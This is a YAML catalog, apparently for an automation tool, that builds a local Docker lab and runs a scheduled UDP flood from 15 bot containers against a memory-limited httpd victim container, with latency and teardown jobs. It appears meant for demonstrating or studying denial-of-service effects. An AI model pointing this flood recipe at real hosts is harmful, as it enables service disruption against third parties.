spec: v1.0
desc: Catalog with UDP flood attacks.

dataset:
  - const: src
    desc: Dir where the source templates are.
    value: $(__dir)/_$(__catalogName)
    tags: [hidden]

  - const: dst
    desc: Local directory where to save the files.
    value: $(workDir)

  - const: net
    desc: Data on the network to use.
    value:
      name: udp-flood
      driver: bridge

  - const: victim
    desc: Victim data, that is, the container to be attacked.
    value:
      container: udp-victim
      image: httpd:alpine
      maxSockets: 4
      memory: 6m
      cores: 1

  - const: bot
    desc: Bot data, that is, the containers to be the bots
    value:
      container: udp-bot
      image: akromio/gattuso:latest
      botnetSize: 15
      msg:
        count: 15000 # messages/bot to send
        size:
          min: 29000
          max: 30000

jobs:
  - group: env
    jobs:
      - macro: create-env
        title: Create the Docker environment
        steps:
          - create-net
          - create-victim
          - create-botnet
          - ping

      - macro: remove-env
        title: Remove the Docker environment
        steps:
          - remove-botnet
          - remove-victim
          - remove-net

  - group: net
    jobs:
      - macro: create-net
        title: Create the Docker network
        steps:
          - exec sudo docker network create $(net.name) -d $(net.driver)

      - macro: remove-net
        title: Remove the Docker network
        steps:
          - exec sudo docker network rm $(net.name)

  - group: victim
    jobs:
      - macro: create-victim
        title: Create the victim container
        ini: exec sudo docker pull $(victim.image)
        dataset:
          - const: sysctl
            value: --sysctl net.core.somaxconn=$(victim.maxSockets)
          - const: network
            value: --network $(net.name)
          - const: memory
            value: --memory=$(victim.memory)
          - const: cpus
            value: --cpus=0.25 --cpuset-cpus=$(victim.cores)
          - const: name
            value: --name $(victim.container)
          - const: mount
            value: -v /usr/share/doc/gdisk:/usr/local/apache2/htdocs/
        steps:
          - exec sudo docker run $(name) $(cpus) $(memory) $(network) $(sysctl) $(mount) -p 8080:80 -d $(victim.image)
          - show-victim-conf

      - macro: show-victim-conf
        title: Show the victim conf
        steps:
          - log: exec sudo docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(victim.container)
          - log: exec sudo docker exec -i $(victim.container) sysctl net.core.somaxconn && cat /proc/meminfo | grep MemTotal

      - macro: remove-victim
        title: Remove the victim container
        steps:
          - exec sudo docker rm -f $(victim.container)

  - group: botnet
    jobs:
      - macro: create-botnet
        title: Create the bot containers
        ini: exec sudo docker pull $(bot.image)
        forEach: $i = range 1 $(bot.botnetSize)
        dataset:
          - input: at
            desc: (Date and) time when to start the attack.
          - const: network
            value: --network=$(net.name)
          - const: volume
            value: -v $(workDir)/registry:/registry
          - const: command
            value: gattuso -c udp-flood r attack -a at=$(at)
        steps:
          - quiet: $name = text --name=$(bot.container)$(i)
          - exec sudo docker run $(name) $(network) $(volume) -id $(bot.image) $(command)

      - macro: remove-botnet
        title: Remove the bot containers
        forEach: $i = range 1 $(bot.botnetSize)
        steps:
          - exec sudo docker rm -f $(bot.container)$(i)

      - macro: attack
        title: Perform an attack
        ini: sleep.until $(args.at)
        forEach: $i = range 1 $(bot.msg.count)
        dataset: [msg, port]
        steps:
          - banner $(i)
          - $msg = random.text $(bot.msg.size.min) $(bot.msg.size.max)
          - $port = random 55000 60000
          - udp.send $(msg) $(victim.container) $(port)

  - macro: ping
    title: Ping from bot to victim
    forEach: $i = range 1 $(bot.botnetSize)
    steps:
      - exec sudo docker exec -i $(bot.container)$(i) ping -q -c 2 $(victim.container)

  - macro: latency
    title: Check latency to victim
    forEach: $i = range 1 300
    steps:
      - exec.log curl http_://localhost:8080 -o /dev/null -s -w %{time_total}
      - sleep 2s
